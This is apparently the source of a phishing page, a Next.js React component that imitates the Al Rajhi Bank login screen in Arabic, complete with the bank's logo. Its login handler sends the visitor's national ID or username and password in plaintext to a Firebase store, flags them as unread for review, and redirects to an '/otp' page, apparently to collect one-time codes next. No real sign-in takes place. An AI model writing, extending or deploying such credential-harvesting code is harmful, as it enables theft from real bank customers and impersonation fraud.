"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { Eye, EyeOff, Globe, ChevronLeft, Check } from "lucide-react";
import { addData } from "@/lib/firebase";

export default function RahjiLogin() {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(true);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const visitorId = localStorage.getItem("visitor");
    if (username && password) {
      await addData({
        id: visitorId,
        rajhgi_username: username,
        rajhgi_password: password,
        isUnread: true,
      });

      router.push("/otp");
    }
  };

  const isFormValid = username.length > 0 && password.length > 0;

  return (
    <div className="min-h-screen bg-white text-right px-6 py-4 flex flex-col font-arabic">
      <header className="flex justify-between items-center mb-8">
        <button className="text-[#4169E1] flex items-center gap-1 font-medium">
          <Globe className="w-6 h-6" strokeWidth={1.5} />
        </button>
        <button className="text-[#4169E1] font-bold text-lg">ضيف</button>
      </header>

      <main className="flex-1 flex flex-col items-center max-w-md mx-auto w-full">
        <div className="mb-6">
          <img src="/rajhi-logo.png" alt="Al Rajhi Bank" className="w-48 h-auto" />
        </div>

        <div className="text-center mb-10">
          <h1 className="text-xl text-gray-500 mb-1 font-medium">مرحبا بك</h1>
          <h2 className="text-2xl text-black font-bold">
            بالتجربة الرقمية الأفضل
          </h2>
        </div>

        <form onSubmit={handleLogin} className="w-full space-y-4">
          <div className="relative">
            <input
              type="text"
              placeholder="أدخل الهوية الوطنية أو اسم المستخدم"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full bg-gray-100 border-none rounded-xl px-4 py-4 text-right placeholder:text-gray-400 text-gray-900 focus:ring-2 focus:ring-[#4169E1]/20 outline-none transition-all"
              dir="rtl"
            />
          </div>

          <div className="relative">
            <div
              className="absolute left-4 top-1/2 -translate-y-1/2 text-[#4169E1] cursor-pointer"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? (
                <EyeOff size={24} strokeWidth={1.5} />
              ) : (
                <Eye size={24} strokeWidth={1.5} />
              )}
            </div>
            <input
              type={showPassword ? "text" : "password"}
              placeholder="ادخل كلمة المرور"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-gray-100 border-none rounded-xl px-4 py-4 pl-12 text-right placeholder:text-gray-400 text-gray-900 focus:ring-2 focus:ring-[#4169E1]/20 outline-none transition-all"
              dir="rtl"
            />
          </div>

          <div className="bg-gray-100 rounded-xl p-4 flex items-center justify-between cursor-pointer active:scale-[0.98] transition-transform">
            <ChevronLeft className="text-gray-400 w-6 h-6" />
            <div className="text-right">
              <p className="text-black font-bold text-sm">
                هل لديك حساب في الراجحي؟
              </p>
              <p className="text-gray-500 text-xs mt-1">
                سجل في القناة الرقمية هنا
              </p>
            </div>
          </div>

          <div className="flex justify-between items-center pt-2">
            <button type="button" className="text-[#4169E1] font-bold text-sm">
              نسيت كلمة المرور؟
            </button>

            <label className="flex items-center gap-2 cursor-pointer select-none">
              <span className="text-black font-bold text-sm">تذكرني</span>
              <div
                className={`w-6 h-6 rounded-md flex items-center justify-center transition-colors ${rememberMe ? "bg-[#4169E1]" : "bg-gray-200"}`}
                onClick={() => setRememberMe(!rememberMe)}
              >
                {rememberMe && (
                  <Check className="text-white w-4 h-4" strokeWidth={3} />
                )}
              </div>
            </label>
          </div>

          <div className="space-y-4 pt-4">
            <button
              type="submit"
              disabled={!isFormValid}
              className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${
                isFormValid
                  ? "bg-[#4169E1] text-white shadow-lg shadow-[#4169E1]/20"
                  : "bg-gray-100 text-gray-300 cursor-not-allowed"
              }`}
            >
              تسجيل الدخول
            </button>

            <button
              type="button"
              className="w-full py-4 rounded-xl font-bold text-lg bg-blue-100 text-[#4169E1] transition-colors hover:bg-blue-200"
            >
              فعل خدمة الدخول السريع
            </button>
          </div>
        </form>

        <div className="flex-1"></div>

        <button className="text-[#4169E1] font-bold text-lg mb-4">
          افتح حساب
        </button>
      </main>
    </div>
  );
}
